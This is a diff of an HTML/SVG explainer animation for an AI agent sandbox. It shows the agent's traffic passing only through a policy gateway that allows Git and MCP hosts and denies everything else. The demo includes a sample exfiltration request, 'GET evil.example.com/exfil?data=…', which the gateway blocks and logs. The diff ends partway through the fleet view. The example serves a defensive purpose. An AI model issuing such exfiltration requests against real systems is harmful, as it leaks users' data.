@@ -1,226 +1,356 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>agent-sandbox motion</title>
+<title>agent-sandbox · how a task flows</title>
 <style>
-  html,body{margin:0;background:#0b1220;width:1200px;height:600px;overflow:hidden}
+  html,body{margin:0;background:#0A0B0D;width:1920px;height:1080px;overflow:hidden}
   svg{display:block}
-  :root { --bg:#0b1220; --card:#121b31; --line:#2a3a5c; --txt:#e5e7eb; --mut:#94a3b8; --ok:#22c55e; --bad:#ef4444; --blue:#60a5fa; --amber:#fbbf24; }
-  text { fill: var(--txt); font-size: 15px; font-family: Inter, Helvetica, Arial, sans-serif; }
-  .mut { fill: var(--mut); font-size: 13px; }
-  .h { font-weight: 600; font-size: 16px; }
-  .card { fill: var(--card); stroke: var(--line); stroke-width: 1.5; rx: 10; }
-  .wire { stroke: var(--line); stroke-width: 2; fill: none; }
-  .pkt { fill: var(--blue); } .ok { fill: var(--ok); } .bad { fill: var(--bad); }
-  /* every timeline animation is 26s linear so one scrub position drives all of them */
-  .kf { animation-duration: 26s; animation-iteration-count: 1; animation-timing-function: linear; animation-fill-mode: both; }
-
-  #sceneA { transform-origin: 600px 300px; animation-name: sceneA; }
-  @keyframes sceneA { 0%,47% { opacity:1; transform:scale(1);} 53%,100% { opacity:0; transform:scale(.25);} }
-  #captionA { animation-name: captionA; } @keyframes captionA { 0%,2% {opacity:0} 4%,46% {opacity:1} 50%,100% {opacity:0} }
-  #typing { animation-name: typing; } @keyframes typing { 0% { width:0 } 5% { width:200px } 100% { width:200px } }
-  #p1 { animation-name: p1; } @keyframes p1 { 0%,5% { opacity:0; transform:translate(0,0);} 6% { opacity:1;} 11% { opacity:1; transform:translate(80px,0);} 12%,100% { opacity:0; transform:translate(80px,0);} }
-  #p2 { animation-name: p2; } @keyframes p2 { 0%,11% { opacity:0; transform:translate(0,0);} 12% { opacity:1;} 14% { transform:translate(80px,0);} 16.5% { opacity:1; transform:translate(380px,0);} 17.5%,100% { opacity:0; transform:translate(380px,0);} }
-  #think { animation-name: think; } @keyframes think { 0%,17% { opacity:0 } 18%,46% { opacity:1 } 47%,100% { opacity:0 } }
-  #think circle { animation: dots 1.2s infinite; } #think circle:nth-child(2){animation-delay:.2s} #think circle:nth-child(3){animation-delay:.4s}
-  @keyframes dots { 0%,100% { opacity:.2 } 50% { opacity:1 } }
-  #r1 { animation-name: r1; } @keyframes r1 { 0%,23% { opacity:0; transform:translate(0,0);} 24% { opacity:1;} 27% { transform:translate(-300px,0);} 29.5% { opacity:1; transform:translate(-300px,-200px);} 30.5%,100% { opacity:0; transform:translate(-300px,-200px);} }
-  #r2 { animation-name: r2; } @keyframes r2 { 0%,31% { opacity:0; transform:translate(0,0);} 32% { opacity:1;} 35% { transform:translate(-300px,0);} 37.5% { opacity:1; transform:translate(-180px,-200px);} 38.5%,100% { opacity:0; transform:translate(-180px,-200px);} }
-  #r3 { animation-name: r3; } @keyframes r3 { 0%,39% { opacity:0; transform:translate(0,0);} 40% { opacity:1;} 43% { transform:translate(-300px,0);} 44% { transform:translate(-290px,0);} 46% { opacity:1; transform:translate(-290px,0);} 47%,100% { opacity:0; transform:translate(-290px,0);} }
-  #lbl1 { animation-name: lbl1; } @keyframes lbl1 { 0%,23% {opacity:0} 24%,30% {opacity:1} 31%,100% {opacity:0} }
-  #lbl2 { animation-name: lbl2; } @keyframes lbl2 { 0%,31% {opacity:0} 32%,38% {opacity:1} 39%,100% {opacity:0} }
-  #lbl3 { animation-name: lbl3; } @keyframes lbl3 { 0%,39% {opacity:0} 40%,46% {opacity:1} 47%,100% {opacity:0} }
-  #ok1,#ok2,#bad3 { transform-box: fill-box; transform-origin: center; }
-  #ok1 { animation-name: ok1; } @keyframes ok1 { 0%,26.5% {opacity:0; transform:scale(.5)} 27.5%,46% {opacity:1; transform:scale(1)} 47%,100% {opacity:0} }
-  #ok2 { animation-name: ok2; } @keyframes ok2 { 0%,34.5% {opacity:0; transform:scale(.5)} 35.5%,46% {opacity:1; transform:scale(1)} 47%,100% {opacity:0} }
-  #bad3 { animation-name: bad3; } @keyframes bad3 { 0%,42.5% {opacity:0; transform:scale(.5)} 43.5%,46% {opacity:1; transform:scale(1)} 47%,100% {opacity:0} }
-  #deny { animation-name: deny; } @keyframes deny { 0%,43% {opacity:0; transform:translate(0,10px)} 44%,46.5% {opacity:1; transform:translate(0,0)} 47.5%,100% {opacity:0} }
-  #logline { animation-name: logline; } @keyframes logline { 0%,43.5% {opacity:0} 44.5%,46.5% {opacity:1} 47.5%,100% {opacity:0} }
-
-  #sceneB { transform-origin: 600px 300px; animation-name: sceneB; }
-  @keyframes sceneB { 0%,47% { opacity:0; transform:scale(2.6);} 54% { opacity:1; transform:scale(1);} 96% { opacity:1; transform:scale(1);} 100% { opacity:0; transform:scale(1);} }
-  #caption { animation-name: caption; } @keyframes caption { 0%,47% {opacity:0} 54%,95% {opacity:1} 99%,100% {opacity:0} }
-  .pod { transform-box: fill-box; transform-origin: center; }
-  #podNew { animation-name: podNew; } @keyframes podNew { 0%,62% {opacity:0; transform:scale(.3)} 65%,100% {opacity:1; transform:scale(1)} }
-  #podNew2 { animation-name: podNew2; } @keyframes podNew2 { 0%,76% {opacity:0; transform:scale(.3)} 79%,100% {opacity:1; transform:scale(1)} }
-  #podDie { animation-name: podDie; } @keyframes podDie { 0%,70% {opacity:1; transform:scale(1)} 74%,100% {opacity:.25; transform:scale(.92)} }
-  #podDieTxt { animation-name: podDieTxt; } @keyframes podDieTxt { 0%,72% {opacity:0} 75%,100% {opacity:1} }
-  #taskPkt { animation-name: taskPkt; } @keyframes taskPkt { 0%,56% {opacity:0; transform:translate(0,0)} 57% {opacity:1} 61% {opacity:1; transform:translate(0,80px)} 62%,100% {opacity:0} }
-  #prPkt { animation-name: prPkt; } @keyframes prPkt { 0%,66% {opacity:0; transform:translate(0,0)} 67% {opacity:1} 71% {opacity:1; transform:translate(245px,-60px)} 72%,100% {opacity:0} }
-  #prevPkt { animation: prev 2.4s infinite linear; } @keyframes prev { 0% {opacity:0; transform:translate(0,0)} 10% {opacity:1} 90% {opacity:1; transform:translate(160px,0)} 100% {opacity:0; transform:translate(160px,0)} }
-  .beat { animation: beat 1.8s infinite ease-in-out; } @keyframes beat { 0%,100% {opacity:.35} 50% {opacity:1} }
-  .flow1 { animation: flow 2s infinite linear; } .flow2 { animation: flow 2s infinite linear; animation-delay:.7s } .flow3 { animation: flow 2s infinite linear; animation-delay:1.3s }
-  @keyframes flow { 0% {offset-distance:0%; opacity:0} 10% {opacity:1} 90% {opacity:1} 100% {offset-distance:100%; opacity:0} }
+  text{fill:#E6E8EB;font-family:Inter,"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:26px}
+  .mono{font-family:"JetBrains Mono","SF Mono",Menlo,monospace}
+  .t1{fill:#E6E8EB}.t2{fill:#9BA1AC}.t3{fill:#6B7280}
+  .h{font-size:30px;font-weight:600}
+  .cap{font-size:36px;font-weight:600}.sub{font-size:28px;fill:#9BA1AC}
+  .card{fill:#101216;stroke:#2A2E37;stroke-width:2;rx:12}
+  .frame{fill:#0D0E11;stroke:#1E2127;stroke-width:2;rx:16}
+  .wire{stroke:#2A2E37;stroke-width:3;fill:none}
+  .fn{fill:#82AAFF}.ok{fill:#C3E88D}.err{fill:#F07178}.num{fill:#F78C6C}.kw{fill:#C792EA}.cst{fill:#FFCB6B}
+  g{transform-box:fill-box;transform-origin:center}
+  [data-a]{opacity:0}
 </style>
-<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="600" viewBox="0 0 1200 600">
-  <rect width="1200" height="600" fill="#0b1220"/>
+<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080" viewBox="0 0 1920 1080">
+<rect width="1920" height="1080" fill="#0A0B0D"/>
+<text x="100" y="86" class="mono t3" style="font-size:22px">agent-sandbox · how one task flows through the system</text>
 
-  <!-- ================= SCENE A: one task ================= -->
-  <g id="sceneA" class="kf">
-    <text id="captionA" class="kf mut" x="40" y="60">One task, start to finish. The agent only ever talks to the gateway; the gateway only lets through what the policy says.</text>
+<!-- ===================== STAGE A ===================== -->
+<g id="stageA">
 
-    <rect x="570" y="90" width="110" height="52" class="card"/>
-    <text x="625" y="112" text-anchor="middle">MCP</text>
-    <text x="625" y="131" text-anchor="middle" class="mut">mcp.example.com</text>
-    <rect x="690" y="90" width="110" height="52" class="card"/>
-    <text x="745" y="112" text-anchor="middle">Git</text>
-    <text x="745" y="131" text-anchor="middle" class="mut">git.example.com</text>
-    <rect x="810" y="90" width="120" height="52" class="card" stroke-dasharray="4 3" opacity=".55"/>
-    <text x="870" y="112" text-anchor="middle" opacity=".7">anything else</text>
-    <text x="870" y="131" text-anchor="middle" class="mut">evil.example.com</text>
+  <!-- API client -->
+  <g id="client" data-a>
+    <rect x="100" y="440" width="470" height="230" class="card"/>
+    <text x="130" y="486" class="h">API client</text>
+    <text x="130" y="520" class="t3" style="font-size:24px">your UI, CLI or CI</text>
+    <text id="req1" x="130" y="578" class="mono fn" style="font-size:19px"></text>
+    <text id="req2" x="130" y="616" class="mono t1" style="font-size:19px"></text>
+  </g>
 
-    <rect x="40" y="250" width="220" height="100" class="card"/>
-    <text x="56" y="276" class="h">API client</text>
-    <text x="56" y="298" class="mut">POST /v1/sandboxes/sb_1/runs</text>
-    <clipPath id="typeclip"><rect id="typing" class="kf" x="56" y="306" width="0" height="30"/></clipPath>
-    <text x="56" y="328" clip-path="url(#typeclip)" fill="#fbbf24">"add tests for checkout"</text>
+  <!-- sandboxd -->
+  <g id="sbd" data-a>
+    <rect x="640" y="440" width="320" height="230" class="card"/>
+    <text x="670" y="486" class="h">sandboxd</text>
+    <text x="670" y="520" class="t3" style="font-size:24px">control plane, one binary</text>
+    <text id="sbd1" x="670" y="576" class="t2" data-a>queues the run</text>
+    <text id="sbd2" x="670" y="614" class="t2" data-a>wakes the pod</text>
+    <text id="sbd3" x="670" y="652" class="t2" data-a>issues its identity</text>
+  </g>
 
-    <rect x="340" y="250" width="180" height="100" class="card"/>
-    <text x="430" y="280" text-anchor="middle" class="h">sandboxd</text>
-    <text x="430" y="300" text-anchor="middle" class="mut">queue run, wake pod</text>
-    <text x="430" y="320" text-anchor="middle" class="mut">identity · policy · DNS</text>
-
-    <rect x="600" y="200" width="200" height="200" class="card" stroke="#3b82f6"/>
-    <text x="700" y="232" text-anchor="middle" class="h">gateway</text>
-    <text x="700" y="254" text-anchor="middle" class="mut">Caddy mTLS · 10.77.77.1</text>
-    <text x="700" y="278" text-anchor="middle" class="mut">who?  → client cert</text>
-    <text x="700" y="298" text-anchor="middle" class="mut">allowed?  → policy</text>
-    <text x="700" y="318" text-anchor="middle" class="mut">secrets injected here</text>
-    <text x="700" y="382" text-anchor="middle" class="mut">policies/backend-dev.yaml</text>
-
-    <rect x="900" y="250" width="260" height="100" class="card" stroke="#22c55e"/>
-    <text x="916" y="276" class="h">pod · backend-dev / n=7</text>
-    <text x="916" y="298" class="mut">one interface: 10.77.77.10 → gateway</text>
-    <text x="916" y="318" class="mut">agent-runner → claude -p "$TASK"</text>
-    <g id="think" class="kf">
-      <circle cx="1100" cy="336" r="4" fill="#fbbf24"/><circle cx="1114" cy="336" r="4" fill="#fbbf24"/><circle cx="1128" cy="336" r="4" fill="#fbbf24"/>
+  <!-- gateway -->
+  <g id="gw" data-a>
+    <rect x="1040" y="380" width="360" height="320" class="card" stroke="#82AAFF"/>
+    <text x="1070" y="426" class="h">gateway</text>
+    <text x="1070" y="460" class="t3" style="font-size:24px">Caddy · mTLS · 10.77.77.1</text>
+    <text x="1070" y="512" class="t2">who?  <tspan class="t3">→ the certificate</tspan></text>
+    <text x="1070" y="548" class="t2">allowed?  <tspan class="t3">→ the policy</tspan></text>
+    <rect x="1060" y="580" width="320" height="100" rx="8" fill="#16181D" stroke="#2A2E37" stroke-width="2"/>
+    <text id="v0" x="1080" y="636" class="mono t3" style="font-size:20px">waiting for a request…</text>
+    <g id="vOk1" data-a>
+      <text x="1080" y="620" class="mono ok" style="font-size:20px">✓ allowed</text>
+      <text x="1080" y="654" class="mono t2" style="font-size:19px">rule: mcp.example.com</text>
     </g>
-
-    <line x1="260" y1="300" x2="340" y2="300" class="wire"/>
-    <line x1="520" y1="300" x2="600" y2="300" class="wire"/>
-    <line x1="800" y1="300" x2="900" y2="300" class="wire"/>
-    <line x1="625" y1="142" x2="625" y2="200" class="wire"/>
-    <line x1="745" y1="142" x2="745" y2="200" class="wire"/>
-    <line x1="870" y1="142" x2="870" y2="190" class="wire" stroke-dasharray="4 4" opacity=".5"/>
-
-    <g id="p1" class="kf"><circle cx="268" cy="300" r="7" class="pkt"/></g>
-    <g id="p2" class="kf"><circle cx="528" cy="300" r="7" class="pkt"/></g>
-    <g id="r1" class="kf"><circle cx="925" cy="300" r="7" class="pkt"/></g>
-    <g id="r2" class="kf"><circle cx="925" cy="300" r="7" class="pkt"/></g>
-    <g id="r3" class="kf"><circle cx="925" cy="300" r="7" fill="#fbbf24"/></g>
-
-    <g id="lbl1" class="kf"><text x="1030" y="384" text-anchor="middle" class="mut">POST mcp.example.com/mcp  tools/list</text></g>
-    <g id="lbl2" class="kf"><text x="1030" y="384" text-anchor="middle" class="mut">POST git.example.com/…/git-receive-pack → agent/backend-dev-7</text></g>
-    <g id="lbl3" class="kf"><text x="1030" y="384" text-anchor="middle" fill="#fbbf24">GET evil.example.com/exfil?data=…</text></g>
-
-    <g id="ok1" class="kf"><circle cx="625" cy="171" r="12" class="ok"/><path d="M618 171 l5 5 l10 -11" stroke="#0b1220" stroke-width="3" fill="none"/></g>
-    <g id="ok2" class="kf"><circle cx="745" cy="171" r="12" class="ok"/><path d="M738 171 l5 5 l10 -11" stroke="#0b1220" stroke-width="3" fill="none"/></g>
-    <g id="bad3" class="kf"><circle cx="820" cy="300" r="13" class="bad"/><path d="M813 293 l14 14 M827 293 l-14 14" stroke="#0b1220" stroke-width="3"/></g>
-    <g id="deny" class="kf">
-      <rect x="560" y="420" width="430" height="78" rx="8" fill="#1f0f12" stroke="#ef4444" stroke-width="1.5"/>
-      <text x="576" y="446" fill="#fca5a5" class="h">403 · evil.example.com is not in policy backend-dev</text>
-      <text x="576" y="468" class="mut">DNS: NXDOMAIN · firewall: only 10.77.77.1:443 · no rule, no route</text>
-      <text x="576" y="488" class="mut">logged: backend-dev/7 · tenant alice · GET evil.example.com /exfil · deny</text>
+    <g id="vOk2" data-a>
+      <text x="1080" y="620" class="mono ok" style="font-size:20px">✓ allowed · token added</text>
+      <text x="1080" y="654" class="mono t2" style="font-size:19px">+ Authorization: •••••</text>
     </g>
-    <g id="logline" class="kf">
-      <text x="40" y="560" class="mut" font-family="ui-monospace, Menlo, monospace" font-size="12.5px">{"verdict":"deny","agent":"backend-dev/7","tenant":"alice","host":"evil.example.com","method":"GET","uri":"/exfil","reason":"policy: no rule"}</text>
+    <g id="vBad" data-a>
+      <text x="1080" y="620" class="mono err" style="font-size:20px">✗ denied · 403</text>
+      <text x="1080" y="654" class="mono t2" style="font-size:19px">no matching rule</text>
     </g>
   </g>
 
-  <!-- ================= SCENE B: the fleet ================= -->
-  <g id="sceneB" class="kf">
-    <g id="caption" class="kf"><text class="mut" x="40" y="50">Zoom out: the fleet.</text><text class="mut" x="40" y="70">Pods come and go, each with its own</text><text class="mut" x="40" y="88">number, all with one single exit.</text></g>
-
-    <rect x="520" y="260" width="160" height="80" class="card" stroke="#3b82f6"/>
-    <text x="600" y="292" text-anchor="middle" class="h">gateway</text>
-    <text x="600" y="314" text-anchor="middle" class="mut">10.77.77.1 · policy · mTLS</text>
-    <g class="beat"><rect x="520" y="260" width="160" height="80" rx="10" fill="none" stroke="#3b82f6" stroke-width="3" opacity=".5"/></g>
-
-    <path d="M190 150 C 350 150, 420 260, 520 290" class="wire" opacity=".4"/>
-    <path d="M190 470 C 350 470, 420 340, 520 320" class="wire" opacity=".4"/>
-    <path d="M1010 150 C 850 150, 780 260, 680 290" class="wire" opacity=".4"/>
-    <path d="M1010 470 C 850 470, 780 340, 680 320" class="wire" opacity=".4"/>
-    <path d="M600 80 L 600 260" class="wire" opacity=".4"/>
-    <circle r="5" class="pkt flow1" style="offset-path: path('M190 150 C 350 150, 420 260, 520 290')"/>
-    <circle r="5" class="pkt flow2" style="offset-path: path('M190 470 C 350 470, 420 340, 520 320')"/>
-    <circle r="5" class="pkt flow3" style="offset-path: path('M1010 150 C 850 150, 780 260, 680 290')"/>
-    <circle r="5" class="pkt flow1" style="offset-path: path('M1010 470 C 850 470, 780 340, 680 320')"/>
-    <circle r="5" class="ok flow3" style="offset-path: path('M600 260 L 600 80')"/>
-
-    <rect x="520" y="30" width="160" height="50" class="card"/>
-    <text x="600" y="51" text-anchor="middle">Git · LLM · MCP</text>
-    <text x="600" y="69" text-anchor="middle" class="mut">allowlist, secrets injected</text>
-
-    <g class="pod">
-      <rect x="40" y="110" width="150" height="80" class="card" stroke="#22c55e"/>
-      <text x="56" y="134" class="h">reviewer / 3</text>
-      <text x="56" y="154" class="mut">reviews PR #42</text>
-      <text x="56" y="172" class="mut">comments via Git API</text>
-    </g>
-    <g class="pod">
-      <rect x="40" y="430" width="150" height="80" class="card" stroke="#22c55e"/>
-      <text x="56" y="454" class="h">docs-writer / 5</text>
-      <text x="56" y="474" class="mut">writes docs for v0.2</text>
-      <text x="56" y="492" class="mut">push → agent/docs-writer-5</text>
-    </g>
-    <g class="pod">
-      <rect x="1010" y="110" width="150" height="80" class="card" stroke="#22c55e"/>
-      <text x="1026" y="134" class="h">backend-dev / 7</text>
-      <text x="1026" y="154" class="mut">refactors payments/</text>
-      <text x="1026" y="172" class="mut">tests green, opens PR</text>
-    </g>
-    <g class="pod kf" id="podDie">
-      <rect x="1010" y="430" width="150" height="80" class="card" stroke="#22c55e"/>
-      <text x="1026" y="454" class="h">netops / 4</text>
-      <text x="1026" y="474" class="mut">NetBox audit done</text>
-      <text x="1026" y="492" class="mut">idle 1h …</text>
-    </g>
-    <g id="podDieTxt" class="kf"><text x="1085" y="532" text-anchor="middle" fill="#fbbf24" class="mut">sleeping · n=4 retired</text></g>
-
-    <rect x="300" y="60" width="160" height="50" class="card" stroke-dasharray="4 3"/>
-    <text x="380" y="81" text-anchor="middle">task tracker</text>
-    <text x="380" y="99" text-anchor="middle" class="mut">via API: POST /runs</text>
-    <g class="pod">
-      <rect x="305" y="200" width="150" height="80" class="card" stroke="#22c55e"/>
-      <text x="321" y="224" class="h">backend-dev / 8</text>
-      <text x="321" y="244" class="mut">takes task TV-311</text>
-      <text x="321" y="262" class="mut">"fix flaky e2e"</text>
-    </g>
-    <line x1="380" y1="110" x2="380" y2="200" class="wire" opacity=".4"/>
-    <g id="taskPkt" class="kf"><rect x="372" y="112" width="16" height="12" rx="2" fill="#fbbf24"/></g>
-
-    <line x1="455" y1="240" x2="700" y2="180" class="wire" opacity=".25" stroke-dasharray="3 4"/>
-    <g id="prPkt" class="kf"><circle cx="455" cy="240" r="6" class="ok"/></g>
-    <g class="pod">
-      <rect x="700" y="140" width="150" height="80" class="card" stroke="#22c55e"/>
-      <text x="716" y="164" class="h">reviewer / 9</text>
-      <text x="716" y="184" class="mut">waits for the PR,</text>
-      <text x="716" y="202" class="mut">then reviews it</text>
-    </g>
-
-    <g class="pod">
-      <rect x="305" y="400" width="190" height="90" class="card" stroke="#22c55e"/>
-      <text x="321" y="424" class="h">frontend-dev / 6</text>
-      <text x="321" y="444" class="mut">vite on 0.0.0.0:3000</text>
-      <text x="321" y="462" class="mut">preview: shop-alice.preview…</text>
-      <text x="321" y="480" class="mut">sandboxctl preview -port 3000</text>
-    </g>
-    <line x1="495" y1="445" x2="660" y2="445" class="wire" opacity=".4"/>
-    <g id="prevPkt"><circle cx="500" cy="445" r="5" fill="#fbbf24"/></g>
-    <rect x="660" y="415" width="150" height="60" class="card" stroke-dasharray="4 3"/>
-    <text x="735" y="440" text-anchor="middle">browser</text>
-    <text x="735" y="458" text-anchor="middle" class="mut">https://…preview.example.com</text>
-
-    <g class="pod kf" id="podNew">
-      <rect x="860" y="250" width="150" height="80" class="card" stroke="#22c55e"/>
-      <text x="876" y="274" class="h">backend-dev / 10</text>
-      <text x="876" y="294" class="mut">new pod → CSR → cert</text>
-      <text x="876" y="312" class="mut">n=10, never reused</text>
-    </g>
-    <g class="pod kf" id="podNew2">
-      <rect x="700" y="500" width="150" height="80" class="card" stroke="#22c55e"/>
-      <text x="716" y="524" class="h">docs-writer / 11</text>
-      <text x="716" y="544" class="mut">woke up: new task</text>
-      <text x="716" y="562" class="mut">same volume, new cert</text>
-    </g>
+  <!-- pod -->
+  <g id="pod" data-a>
+    <rect x="1460" y="170" width="420" height="200" class="card" stroke="#C3E88D"/>
+    <text x="1490" y="216" class="h">pod</text>
+    <text x="1490" y="250" class="t3" style="font-size:24px">one network interface → gateway</text>
+    <text x="1490" y="296" class="mono t2" style="font-size:20px">runs: claude -p "$TASK"</text>
+    <text id="identTxt" x="1490" y="336" class="mono" style="font-size:20px" data-a><tspan class="t3">cert: </tspan><tspan class="kw">backend-dev</tspan><tspan class="t3">/</tspan><tspan class="num">7</tspan><tspan class="t3"> · </tspan><tspan class="cst">alice</tspan></text>
   </g>
+  <g id="think" data-a>
+    <circle cx="1790" cy="212" r="6" fill="#FFCB6B"/><circle cx="1810" cy="212" r="6" fill="#FFCB6B"/><circle cx="1830" cy="212" r="6" fill="#FFCB6B"/>
+  </g>
+  <!-- request slot under the pod -->
+  <g id="rq1" data-a><rect x="1460" y="390" width="420" height="50" rx="8" fill="#16181D" stroke="#82AAFF" stroke-width="2"/><text x="1480" y="423" class="mono t1" style="font-size:20px"><tspan class="kw">POST</tspan> mcp.example.com/mcp</text></g>
+  <g id="rq2" data-a><rect x="1460" y="390" width="420" height="50" rx="8" fill="#16181D" stroke="#82AAFF" stroke-width="2"/><text x="1480" y="423" class="mono t1" style="font-size:20px"><tspan class="kw">POST</tspan> git…/git-receive-pack</text></g>
+  <g id="rq3" data-a><rect x="1460" y="390" width="420" height="50" rx="8" fill="#16181D" stroke="#FFCB6B" stroke-width="2"/><text x="1480" y="423" class="mono t1" style="font-size:20px"><tspan class="cst">GET</tspan> evil.example.com/exfil</text></g>
+
+  <!-- externals -->
+  <g id="mcp" data-a>
+    <rect x="1040" y="170" width="175" height="90" class="card"/>
+    <text x="1127" y="208" text-anchor="middle" class="h" style="font-size:26px">MCP</text>
+    <text x="1127" y="240" text-anchor="middle" class="mono t3" style="font-size:18px">mcp.example.com</text>
+  </g>
+  <g id="git" data-a>
+    <rect x="1225" y="170" width="175" height="90" class="card"/>
+    <text x="1312" y="208" text-anchor="middle" class="h" style="font-size:26px">Git</text>
+    <text x="1312" y="240" text-anchor="middle" class="mono t3" style="font-size:18px">git.example.com</text>
+  </g>
+
+  <!-- wires -->
+  <g id="w1" data-a><line x1="570" y1="555" x2="640" y2="555" class="wire"/></g>
+  <g id="w2" data-a><line x1="960" y1="555" x2="1040" y2="555" class="wire"/></g>
+  <g id="w3" data-a>
+    <path d="M1460 300 L1420 300 L1420 460 L1400 460" class="wire"/>
+    <text x="1436" y="380" text-anchor="middle" class="mono t3" style="font-size:18px" transform="rotate(-90 1436 380)">the only route</text>
+  </g>
+  <g id="w4" data-a><line x1="1127" y1="260" x2="1127" y2="380" class="wire"/></g>
+  <g id="w5" data-a><line x1="1312" y1="260" x2="1312" y2="380" class="wire"/></g>
+  <path id="pathToGw" d="M1460 300 L1420 300 L1420 460 L1400 460" fill="none" stroke="none"/>
+  <path id="pathGwMcp" d="M1127 380 L1127 260" fill="none" stroke="none"/>
+  <path id="pathGwGit" d="M1312 380 L1312 260" fill="none" stroke="none"/>
+  <path id="pathClientSbd" d="M570 555 L640 555" fill="none" stroke="none"/>
+  <path id="pathSbdGw" d="M960 555 L1040 555" fill="none" stroke="none"/>
+
+  <!-- packets (moved along paths by the engine) -->
+  <g id="pk1" data-a><circle r="10" class="fn"/></g>
+  <g id="pk2" data-a><circle r="10" class="fn"/></g>
+  <g id="pk3" data-a><circle r="10" class="fn"/></g>
+  <g id="pk4" data-a><circle r="10" class="fn"/></g>
+  <g id="pk5" data-a><circle r="10" fill="#FFCB6B"/></g>
+
+  <!-- verdict marks on the external wires -->
+  <g id="ok1" data-a><circle cx="1127" cy="320" r="18" class="ok"/><path d="M1116 320 l8 8 l15 -17" stroke="#0A0B0D" stroke-width="4" fill="none"/></g>
+  <g id="ok2" data-a><circle cx="1312" cy="320" r="18" class="ok"/><path d="M1301 320 l8 8 l15 -17" stroke="#0A0B0D" stroke-width="4" fill="none"/></g>
+  <g id="bad" data-a><circle cx="1400" cy="460" r="20" class="err"/><path d="M1389 449 l22 22 M1411 449 l-22 22" stroke="#0A0B0D" stroke-width="4"/></g>
+
+  <!-- policy panel -->
+  <g id="policy" data-a>
+    <rect x="1460" y="470" width="420" height="310" class="frame"/>
+    <rect x="1464" y="474" width="412" height="302" rx="12" fill="#101216" stroke="#1E2127" stroke-width="2"/>
+    <text x="1484" y="506" class="mono t3" style="font-size:19px">policies/backend-dev.yaml</text>
+    <line x1="1464" y1="520" x2="1876" y2="520" stroke="#1E2127" stroke-width="2"/>
+    <g id="pl1"><rect x="1466" y="532" width="408" height="36" rx="4" fill="#C3E88D" opacity="0"/><text x="1484" y="558" class="mono" style="font-size:20px"><tspan class="t3">- host: </tspan><tspan class="t1">git.example.com</tspan></text></g>
+    <g id="pl2"><rect x="1466" y="570" width="408" height="36" rx="4" fill="#C3E88D" opacity="0"/><text x="1484" y="596" class="mono" style="font-size:20px"><tspan class="t3">  paths: </tspan><tspan class="t2">[…/git-receive-pack]</tspan></text></g>
+    <g id="pl3"><rect x="1466" y="608" width="408" height="36" rx="4" fill="#C3E88D" opacity="0"/><text x="1484" y="634" class="mono" style="font-size:20px"><tspan class="t3">  inject: </tspan><tspan class="t2">Authorization: secret</tspan></text></g>
+    <g id="pl4"><rect x="1466" y="646" width="408" height="36" rx="4" fill="#C3E88D" opacity="0"/><text x="1484" y="672" class="mono" style="font-size:20px"><tspan class="t3">- host: </tspan><tspan class="t1">mcp.example.com</tspan></text></g>
+    <g id="pl5"><rect x="1466" y="684" width="408" height="36" rx="4" fill="#C3E88D" opacity="0"/><text x="1484" y="710" class="mono" style="font-size:20px"><tspan class="t3">  paths: </tspan><tspan class="t2">[/mcp]  </tspan><tspan class="t3">read_only</tspan></text></g>
+    <text id="nomatch" x="1484" y="756" class="mono err" style="font-size:20px" data-a>evil.example.com → no rule</text>
+  </g>
+
+  <!-- deny card -->
+  <g id="deny" data-a>
+    <rect x="620" y="730" width="780" height="150" rx="12" fill="#17100f" stroke="#F07178" stroke-width="2"/>
+    <text x="650" y="776" class="h err" style="font-size:30px">403 · evil.example.com is not in the policy</text>
+    <text x="650" y="816" class="t2" style="font-size:24px">Denied by default: no rule means no route.</text>
+    <text x="650" y="852" class="t2" style="font-size:24px">DNS answered NXDOMAIN, the firewall allows only 10.77.77.1:443.</text>
+  </g>
+  <g id="log" data-a>
+    <text x="100" y="730" class="mono t3" style="font-size:19px">{"verdict":"deny","agent":"backend-dev/7","tenant":"alice","host":"evil.example.com","uri":"/exfil"}</text>
+  </g>
+</g>
+
+<!-- ===================== STAGE B: the fleet ===================== -->
+<g id="stageB">
+  <g id="fgw" data-a>
+    <rect x="810" y="470" width="300" height="130" class="card" stroke="#82AAFF"/>
+    <text x="960" y="520" text-anchor="middle" class="h">gateway</text>
+    <text x="960" y="556" text-anchor="middle" class="t3" style="font-size:24px">10.77.77.1 · policy · mTLS</text>
+    <text x="960" y="586" text-anchor="middle" class="mono t3" style="font-size:20px">one exit for everyone</text>
+  </g>
+  <g id="fext" data-a>
+    <rect x="810" y="200" width="300" height="100" class="card"/>
+    <text x="960" y="242" text-anchor="middle" class="h" style="font-size:26px">Git · LLM · MCP</text>
+    <text x="960" y="276" text-anchor="middle" class="t3" style="font-size:22px">allowed hosts, secrets injected</text>
+    <line x1="960" y1="300" x2="960" y2="470" class="wire"/>
+  </g>
+
+  <!-- left column -->
+  <g id="f1" data-a>
+    <rect x="160" y="200" width="420" height="130" class="card" stroke="#C3E88D"/>
+    <text x="190" y="246" class="h" style="font-size:26px">reviewer <tspan class="mono num">/ 3</tspan></text>
+    <text x="190" y="284" class="t2" style="font-size:24px">reviews PR #42</text>
+    <text x="190" y="314" class="t3" style="font-size:22px">comments through the Git API</text>
+    <path d="M580 265 C 700 265, 740 500, 810 520" class="wire"/>
+  </g>
+  <g id="f2" data-a>
+    <rect x="160" y="470" width="420" height="130" class="card" stroke="#C3E88D"/>
+    <text x="190" y="516" class="h" style="font-size:26px">docs-writer <tspan class="mono num">/ 5</tspan></text>
+    <text x="190" y="554" class="t2" style="font-size:24px">writes the docs for v0.2</text>
+    <text x="190" y="584" class="t3" style="font-size:22px">pushes to agent/docs-writer-5</text>
+    <line x1="580" y1="535" x2="810" y2="535" class="wire"/>
+  </g>
+  <g id="f3" data-a>
+    <rect x="160" y="700" width="420" height="130" class="card" stroke="#C3E88D"/>
+    <text x="190" y="746" class="h" style="font-size:26px">backend-dev <tspan class="mono num">/ 8</tspan></text>
+    <text x="190" y="784" class="t2" style="font-size:24px">takes task TV-311</text>
+    <text x="190" y="814" class="t3" style="font-size:22px">the tracker called POST /runs</text>
+    <path d="M580 765 C 700 765, 740 570, 810 550" class="wire"/>
+  </g>
+  <g id="tracker" data-a>
+    <rect x="160" y="845" width="420" height="60" rx="8" fill="#16181D" stroke="#2A2E37" stroke-width="2" stroke-dasharray="6 4"/>
+    <text x="190" y="883" class="t3" style="font-size:22px">task tracker → API → run queued</text>
+  </g>
+
+  <!-- right column -->
+  <g id="f4" data-a>
